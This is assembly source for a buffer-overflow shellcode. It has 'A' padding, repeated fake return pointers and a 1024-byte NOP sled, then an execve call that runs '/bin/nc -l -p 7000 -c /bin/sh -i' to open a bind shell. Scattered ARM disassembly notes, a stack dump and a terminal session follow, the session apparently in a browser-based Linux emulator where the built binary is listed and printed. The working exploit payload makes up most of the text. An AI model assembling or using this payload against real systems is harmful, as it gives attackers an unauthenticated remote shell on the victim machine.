
.text


	
	                
    .global _start      
                        


	_start:		jmp start_nops

	
			
.data
buffer:	.space		16, 'A'		


	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp

	
data_start:	
	.align		4
	.ascii		"arg>"		
	
p0:	.asciz		"/bin/nc"          
p1:	.asciz		"-l"               
p2:	.asciz          "-p"		   
p3:	.asciz          "7000"		   
p4:	.asciz          "-c"               
p5:	.ascii          "/bin/sh"	   
p5b:	.asciz		"!-i"              


args:	
pp0:	.long		0
pp1:	.long		0
pp2:	.long		0
pp3:	.long		0
pp4:	.long		0
pp5:	.long		0
pp6:	.long		0

	.ascii		"env>"
env:	.long		0                  

	
	        

	.ascii		"nops>"





start_nops: 	.space		1024, 0x90		

		

	
	
	call self
self:
	pop %ebp
	
	
	leal	(p0-self) (%ebp), %ebx	

	leal	(args-self) (%ebp), %ecx		
	leal	(p0-self)(%ebp), %eax
	movl	%eax, (pp0-self)(%ebp)
	leal	(p1-self)(%ebp), %eax
	movl	%eax, (pp1-self)(%ebp)
	leal	(p2-self)(%ebp), %eax
	movl	%eax, (pp2-self)(%ebp)
	leal	(p3-self)(%ebp), %eax
	movl	%eax, (pp3-self)(%ebp)
	leal	(p4-self)(%ebp), %eax
	movl	%eax, (pp4-self)(%ebp)
	leal	(p5-self)(%ebp), %eax
	movl	%eax, (pp5-self)(%ebp)

	
	decb	(p5b-self)(%ebp)     
		
        leal	(env-self) (%ebp), %edx		
	
	movl	$111,%eax
	subl	$100,%eax 
						
						
	
        int     $0x80				
	.ascii "<int"
	.ascii "\n"	

------------------
#e1a00000 mov r0,r0
#e2833001 add r3,r3,#1
#e1a01003 mov r1,r3

--
r11=0x7efff66c
sp =0x7efff650

0x7efff650: 0x00000000 0x34333231 0x38373635 0x32313039
0x7efff660: 0x00353433 0x0000000f 0x7efff67c 0x000105f4
0x7efff670: 0x7efff7d4 0x00000001 0x00000000 0x76e7d294
0x7efff680: 0x76fa2000 0x7efff7d4 0x00000001 0x000105dc

--

# .... .. . .... . .... .... ........ ....
# 1110|00|0|1101|0|0000|0000|00000000|0000

localhost:~# cmp a.out t.out
localhost:~# ls -l
total 28
-rw-r--r--    1 root     root          2348 Oct 26 18:54 a.out
-rw-r--r--    1 root     root           114 Jul  5  2020 bench.py
-rw-r--r--    1 root     root            76 Jul  3  2020 hello.c
-rw-r--r--    1 root     root            22 Jun 26  2020 hello.js
-rw-r--r--    1 root     root           151 Jul  5  2020 readme.txt
-rw-r--r--    1 root     root          1452 Oct 26 18:54 t.S
-rw-r--r--    1 root     root          2348 Oct 26 18:53 t.out
localhost:~# cat a.out
ELF4( AAAAAAAAAAAAAAAAarg>/bin/nc-l-p7000-c/bin/sh!-ienv>nops>












]??????
?????????????o?d?<int
?<(@,H0K4N8S<V]"a'a+e/i3m7q;u?yCGLstart_nopsbufferdata_startp5bargspp0pp1pp2pp
3pp4pp5pp6envselffakerp $(,048.symtab.strtab.shstrtab.rel.text.rel.data.bss4
)<%    @8;<    S4localhost:~# ^C
localhost:~#
[Upload files]
 2011-2021 Fabrice Bellard - News - VM list - FAQ - Technical notes
